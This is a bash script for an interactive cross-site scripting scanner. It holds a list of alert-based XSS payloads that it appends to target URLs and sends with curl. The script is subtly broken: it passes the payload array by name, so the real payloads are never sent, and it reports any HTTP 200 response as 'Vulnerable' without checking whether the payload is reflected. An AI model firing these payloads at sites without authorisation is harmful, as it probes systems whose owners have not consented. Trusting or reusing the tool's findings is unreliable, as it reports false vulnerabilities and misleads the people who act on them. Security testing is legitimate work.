#!/bin/bash

# Interactive XSS Testing Tool
# Features:
# 1. Test a single URL or multiple URLs from a file.
# 2. Use default payloads or custom payloads from a file.
# 3. Save results automatically with timestamped filenames.
# 4. Clear, well-designed output for better readability.

# Colors for output
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Default payloads for XSS testing
DEFAULT_PAYLOADS=(
    "<script>alert('XSS')</script>"
    "<img src=x onerror=alert('XSS')>"
    "<svg/onload=alert('XSS')>"
    "<iframe src=javascript:alert('XSS')></iframe>"
    "';alert('XSS');//"
    "\";alert('XSS');//"
    "<body onload=alert('XSS')>"
    "<marquee onstart=alert('XSS')>"
    "<input autofocus onfocus=alert('XSS')>"
    "<details open ontoggle=alert('XSS')>"
)

# Default output file
DEFAULT_OUTPUT_FILE="xss_results_$(date +'%Y%m%d_%H%M%S').txt"

# Display header
header() {
    echo -e "${BLUE}"
    echo "============================================"
    echo "        Interactive XSS Testing Tool        "
    echo "============================================"
    echo -e "${NC}"
}

# Display usage information
usage() {
    echo -e "${YELLOW}"
    echo "Usage:"
    echo "  This tool will guide you step by step to test for XSS vulnerabilities."
    echo "  You can test a single URL or multiple URLs from a file."
    echo "  You can also use default payloads or provide custom payloads."
    echo -e "${NC}"
}

# Function to URL-encode a string
url_encode() {
    local input=$1
    echo -n "$input" | jq -sRr @uri
}

# Function to test a URL with payloads
test_xss() {
    local url=$1
    local payloads=$2
    local output_file=$3

    echo -e "${BLUE}Testing URL: $url${NC}"
    echo "Testing URL: $url" >> "$output_file"
    echo "-----------------------------------" >> "$output_file"

    for payload in "${payloads[@]}"; do
        if [ -z "$payload" ]; then
            continue
        fi

        encoded_payload=$(url_encode "$payload")
        test_url="${url}${encoded_payload}"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$test_url")

        if [[ $response -eq 200 ]]; then
            echo -e "${GREEN}[+] Vulnerable: $payload${NC}"
            echo "[+] Vulnerable: $test_url with payload: $payload" >> "$output_file"
        else
            echo -e "${RED}[-] Not vulnerable: $payload${NC}"
            echo "[-] Not vulnerable: $test_url with payload: $payload" >> "$output_file"
        fi
    done

    echo "" >> "$output_file"
}

# Main function
main() {
    header
    usage

    # Prompt for single URL or file containing URLs
    echo -e "${GREEN}[1] Test a single URL"
    echo -e "[2] Test multiple URLs from a file${NC}"
    read -p "Choose an option (1 or 2): " OPTION

    if [ "$OPTION" == "1" ]; then
        read -p "Enter the URL to test: " URL
        URL_LIST=("$URL")
    elif [ "$OPTION" == "2" ]; then
        read -p "Enter the path to the file containing URLs: " URL_FILE
        if [ ! -f "$URL_FILE" ]; then
            echo -e "${RED}Error: File $URL_FILE not found.${NC}"
            exit 1
        fi
        mapfile -t URL_LIST < "$URL_FILE"
    else
        echo -e "${RED}Invalid option. Exiting.${NC}"
        exit 1
    fi

    # Prompt for payloads
    echo -e "${GREEN}[1] Use default payloads"
    echo -e "[2] Provide custom payloads from a file${NC}"
    read -p "Choose an option (1 or 2): " PAYLOAD_OPTION

    if [ "$PAYLOAD_OPTION" == "1" ]; then
        PAYLOADS=("${DEFAULT_PAYLOADS[@]}")
    elif [ "$PAYLOAD_OPTION" == "2" ]; then
        read -p "Enter the path to the file containing payloads: " PAYLOAD_FILE
        if [ ! -f "$PAYLOAD_FILE" ]; then
            echo -e "${RED}Error: File $PAYLOAD_FILE not found.${NC}"
            exit 1
        fi
        mapfile -t PAYLOADS < "$PAYLOAD_FILE"
    else
        echo -e "${RED}Invalid option. Exiting.${NC}"
        exit 1
    fi

    # Prompt for output file
    read -p "Enter the output file name (default: $DEFAULT_OUTPUT_FILE): " OUTPUT_FILE
    OUTPUT_FILE=${OUTPUT_FILE:-$DEFAULT_OUTPUT_FILE}

    # Clear the output file if it exists
    > "$OUTPUT_FILE"

    # Start testing
    echo -e "${BLUE}Starting XSS testing...${NC}"
    for URL in "${URL_LIST[@]}"; do
        test_xss "$URL" PAYLOADS "$OUTPUT_FILE"
    done

    echo -e "${BLUE}============================================${NC}"
    echo -e "${GREEN}XSS Testing Completed. Results saved to:${NC}"
    echo -e "${YELLOW}$OUTPUT_FILE${NC}"
    echo -e "${BLUE}============================================${NC}"
}

# Run the script
main
